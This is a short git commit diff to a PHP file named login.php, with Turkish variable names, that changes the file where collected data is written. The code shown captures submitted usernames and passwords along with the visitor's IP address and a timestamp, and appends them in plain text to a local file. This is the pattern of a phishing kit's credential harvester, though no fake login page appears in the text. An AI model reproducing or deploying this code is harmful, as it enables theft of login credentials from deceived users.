a1123f44b71832eed74adf3219d98c09d6decaa8
Aydemir <63073634+aydemir98@users.noreply.github.com>
2022-01-14 12:44:39 +0300

    Update login.php

--- login.php
+++ login.php
@@ -7,7 +7,7 @@ $sifre = $_POST['Password'];
 $ip =$_SERVER["REMOTE_ADDR"];
 $tarih = date('d.m.Y - H:i');
 
-$dosya = fopen ("bilgiler.md" , 'a'); 
+$dosya = fopen ("bilgiler.txt" , 'a'); 
 $yaz="Date: ".$tarih."\nUsername:  ". $kullaniciadi . "   Password: " .$sifre."   IP: ".$ip."\n\n";
 fwrite ( $dosya , $yaz ) ;
 fclose ($dosya);
